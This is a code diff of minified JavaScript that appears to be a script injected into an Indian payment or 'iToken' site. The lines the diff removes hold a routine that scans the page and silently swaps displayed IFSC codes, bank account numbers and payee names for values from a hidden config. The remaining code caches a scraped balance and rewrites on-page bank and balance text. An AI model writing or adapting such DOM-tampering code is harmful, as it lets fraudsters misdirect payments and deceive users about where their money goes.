@@ -2641,76 +2641,25 @@ if(!isNaN(bv)&&bv>0){_cachedBal=bv.toFixed(2);
 try{localStorage.setItem('_px_bal',_cachedBal);}catch(e){}return;}}}
 for(var k in obj){if(typeof obj[k]==='object'&&obj[k]!==null&&!Array.isArray(obj[k])){cacheBal(obj[k]);}}}
 
-var STATIC_LABELS = [
-  'name', 'bank', 'ifsc', 'account', 'amount', 'upi id', 'upi',
-  'kyc partner', 'debit time', 'deal time', 'utr', 'order status',
-  'copy', 'finish payment', 'go pay', 'pending', 'in review',
-  'under review, please wait', 'payment info', 'payment prove', 'audit',
-  'itoken', 'buy itoken details', 'buy history', 'reward', 'orderno'
-];
-
-function patchModalDOM(){
-  if(!CFG||!document.body)return;
+function patchBankDOM(){
+  if(!document.body)return;
+  var bName=(CFG&&CFG.bn)||'Bank';
   var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
   var toFix=[];
   while(walker.nextNode()){
     var nd=walker.currentNode;
     var txt=(nd.textContent||'').trim();
-    if(!txt)continue;
-    var txtLower=txt.toLowerCase();
-
-    // NEVER replace UI label headers/titles (e.g. "Name", "Account", "Bank", "IFSC")
-    if(STATIC_LABELS.indexOf(txtLower)!==-1)continue;
-
-    var el=nd.parentElement;
-    if(!el)continue;
-    var p=el.parentElement;
-    var p2=p?p.parentElement:null;
-    var rowCtx=((el.innerText||'')+' '+(p?p.innerText:'')+' '+(p2?p2.innerText:'')).toLowerCase();
-
-    // 1. Ugly JSON in bank name field (like {"code":0...})
     if(txt.indexOf('{"code":')!==-1||txt.indexOf('"msg":')!==-1||txt.indexOf('"data":')!==-1){
-      toFix.push({node:nd,val:(CFG&&CFG.bn)||'Bank'});
-      continue;
-    }
-
-    // 2. IFSC code value (11 chars, e.g. BARB0JODPAL)
-    if(/^[A-Z]{4}0[A-Z0-9]{6}$/.test(txt)){
-      if(CFG.if&&txt!==CFG.if){
-        toFix.push({node:nd,val:CFG.if});
-      }
-      continue;
-    }
-
-    // 3. Bank Account number value (9-22 digits)
-    if(/^\d{9,22}$/.test(txt)){
-      if(rowCtx.indexOf('account')!==-1||rowCtx.indexOf('acct')!==-1||rowCtx.indexOf('bank')!==-1||rowCtx.indexOf('card')!==-1){
-        if(CFG.an&&txt!==CFG.an){
-          toFix.push({node:nd,val:CFG.an});
-        }
-      }
-      continue;
-    }
-
-    // 4. Beneficiary / Payee Name value (Alphabetic string like JAVED, Rahul, etc.)
-    if(/^[A-Za-z\s.]{2,35}$/.test(txt)){
-      if((rowCtx.indexOf('name')!==-1||rowCtx.indexOf('holder')!==-1||rowCtx.indexOf('payee')!==-1)&&
-         rowCtx.indexOf('partner')===-1&&rowCtx.indexOf('status')===-1&&rowCtx.indexOf('itoken')===-1&&rowCtx.indexOf('history')===-1){
-        if(CFG.ah&&txt!==CFG.ah){
-          toFix.push({node:nd,val:CFG.ah});
-        }
-      }
-      continue;
+      toFix.push(nd);
     }
   }
-
   for(var i=0;i<toFix.length;i++){
-    toFix[i].node.textContent=toFix[i].val;
+    toFix[i].textContent=bName;
   }
 }
 
 function patchBalDOM(){
-  patchModalDOM();
+  patchBankDOM();
 if(!_cachedBal||_cachedBal==='0'||_cachedBal==='0.00')return;
 if(!document.body)return;
 var walker=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null,false);
